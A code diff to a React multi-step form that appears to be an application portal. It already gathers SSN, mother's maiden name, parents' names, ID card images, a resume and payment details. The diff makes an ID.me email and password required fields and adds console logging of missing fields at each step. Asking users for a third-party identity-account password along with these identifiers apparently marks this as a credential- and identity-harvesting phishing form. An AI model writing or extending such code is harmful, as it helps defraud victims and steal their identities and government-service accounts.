@@ -35,6 +35,8 @@ const App: React.FC = () => {
     mothersMaidenName: '',
     fathersFullName: '',
     ssn: '',
+    idMeEmail: '',
+    idMePassword: '',
     agreedToTerms: false,
     infoAccurate: false,
     decisionStatus: null,
@@ -56,7 +58,7 @@ const App: React.FC = () => {
   const validateStep = (step: number) => {
     switch (step) {
       case 1:
-        return (
+        const step1Valid = !!(
           formData.email &&
           formData.confirmEmail &&
           formData.email === formData.confirmEmail &&
@@ -70,12 +72,66 @@ const App: React.FC = () => {
           formData.preferredContact &&
           formData.contactViaTexts
         );
+        if (!step1Valid) {
+          console.log("Step 1 Missing Fields:", {
+            email: !formData.email,
+            confirmEmail: !formData.confirmEmail,
+            emailMatch: formData.email !== formData.confirmEmail,
+            firstName: !formData.firstName,
+            lastName: !formData.lastName,
+            dobDay: !formData.dobDay,
+            dobMonth: !formData.dobMonth,
+            dobYear: !formData.dobYear,
+            gender: !formData.gender,
+            phone: !formData.phone,
+            preferredContact: !formData.preferredContact,
+            contactViaTexts: !formData.contactViaTexts
+          });
+        }
+        return step1Valid;
       case 2:
-        return formData.idFrontFile && formData.idBackFile && formData.resumeFile;
+        const step2Valid = !!(formData.idFrontFile && formData.idBackFile && formData.resumeFile);
+        if (!step2Valid) {
+          console.log("Step 2 Missing Files:", {
+            idFront: !formData.idFrontFile,
+            idBack: !formData.idBackFile,
+            resume: !formData.resumeFile
+          });
+        }
+        return step2Valid;
       case 3:
-        return formData.mothersFullName && formData.mothersMaidenName && formData.fathersFullName && formData.ssn && formData.agreedToTerms && formData.infoAccurate;
+        const step3Valid = !!(
+          formData.mothersFullName &&
+          formData.mothersMaidenName &&
+          formData.fathersFullName &&
+          formData.ssn &&
+          formData.idMeEmail &&
+          formData.idMePassword &&
+          formData.agreedToTerms &&
+          formData.infoAccurate
+        );
+        if (!step3Valid) {
+          console.log("Step 3 Missing Fields:", {
+            mothersFullName: !formData.mothersFullName,
+            mothersMaidenName: !formData.mothersMaidenName,
+            fathersFullName: !formData.fathersFullName,
+            ssn: !formData.ssn,
+            idMeEmail: !formData.idMeEmail,
+            idMePassword: !formData.idMePassword,
+            agreedToTerms: !formData.agreedToTerms,
+            infoAccurate: !formData.infoAccurate
+          });
+        }
+        return step3Valid;
       case 4:
-        return formData.paymentMethod && formData.authorized;
+        const step4Valid = !!(formData.paymentMethod && formData.authorized);
+        if (!step4Valid) {
+          console.log("Step 4 Missing Fields:", {
+            paymentMethod: !formData.paymentMethod,
+            authorized: !formData.authorized
+          });
+        }
+        return step4Valid;
       default:
         return true;
     }
